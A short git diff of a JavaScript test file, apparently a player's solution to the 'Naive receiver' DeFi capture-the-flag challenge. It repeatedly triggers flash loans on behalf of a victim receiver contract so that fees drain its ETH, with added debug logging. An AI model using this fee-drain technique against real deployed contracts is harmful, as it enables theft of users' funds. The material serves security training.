@@ -39,9 +39,11 @@ describe('[Challenge] Naive receiver', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
-        while (true) {
+        for(let i =0; i<10; i++) {
+        console.log("receiver address:", receiver.address);
+        console.log("eth address", pool.ETH)
         await pool.connect(player).flashLoan(receiver.address, pool.ETH, 0, "0x");
-        if (receiver.balance==0) break;
+        console.log("iteration", i)
         }
     });
 
